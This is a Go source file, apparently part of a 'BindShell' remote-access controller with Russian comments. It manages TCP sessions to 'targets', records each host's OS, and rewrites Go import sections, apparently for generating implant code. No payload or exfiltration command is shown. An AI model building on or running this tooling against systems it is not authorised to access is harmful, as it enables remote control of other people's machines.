package main

import (
	"fmt"
	"net"
	"strconv"
	"strings"
)

// Структура цели
type Target struct {
	name   string
	conn   net.Conn
	status bool
	group  string
}

func addSession(targets *[]Target, target_name string) {
	// Установка соединения с целевым хостом
	conn, err := net.Dial("tcp", target_name)
	if err != nil {
		fmt.Printf("[BindShell] %s << Connection NOT established.\n", target_name)
		return
	} else {
		fmt.Printf("[BindShell] %s << Connection successfully established.\n", target_name)
	}

	// Создание буфера для считывания ОС целевого хоста
	init_buf := make([]byte, global_buffer_size)

	// Чтение ОС хоста
	n, err := conn.Read(init_buf)
	if err != nil {
		fmt.Println("[BindShell] Failed to read host OS!")
	}

	// Добавление хоста в список целей
	*targets = append(*targets, Target{name: target_name, conn: conn, status: true, group: string(init_buf[:n])})

	active_targets++
}

func finishSession(target Target) {
	if target.conn.Close() == nil {
		fmt.Printf("[BindShell] %s << Connection successfully terminated.\n", target.name)
	}
}

func finishAllSessions(targets *[]Target) {
	for i := 0; i < len(*targets); i++ {
		finishSession((*targets)[i])
	}
}

func checkTargetNumber(targets *[]Target, input string) (bool, int) {
	idx, err := strconv.Atoi(input)
	if err != nil {
		fmt.Println("[BindShell] The index is an invalid number!")
		return false, 0
	} else if idx >= len(*targets) || idx < 0 {
		fmt.Println("[BindShell] The index is out of bounds!")
		return false, 0
	} else {
		return true, idx
	}
}

func checkPositiveNumber(input string) (bool, int) {
	value, err := strconv.Atoi(input)
	if err != nil {
		fmt.Println("[BindShell] The value is an invalid number!")
		return false, 0
	} else if value < 0 {
		fmt.Println("[BindShell] The value lower then zero!")
		return false, 0
	} else {
		return true, value
	}
}

// Проверяет наличие необходимых импортов
func isImportContains(imports []string, imp string) bool {
	for _, i := range imports {
		if i == imp {
			return true
		}
	}
	return false
}

// Обновляет секцию импортов
func updateImports(lines []string, new_imports []string) []string {
	var updatedLines []string
	importSectionStarted := false

	for _, line := range lines {
		if strings.HasPrefix(line, "import (") {
			importSectionStarted = true
			updatedLines = append(updatedLines, line)
			for _, imp := range new_imports {
				updatedLines = append(updatedLines, "\t"+imp)
			}
			continue // Пропускаем добавление закрывающей скобки здесь
		}

		if importSectionStarted && strings.TrimSpace(line) == ")" {
			importSectionStarted = false
		}

		updatedLines = append(updatedLines, line)
	}

	if importSectionStarted { // Если секция импорта была открыта, добавим закрывающую скобку
		updatedLines = append(updatedLines, ")")
	}

	return updatedLines
}
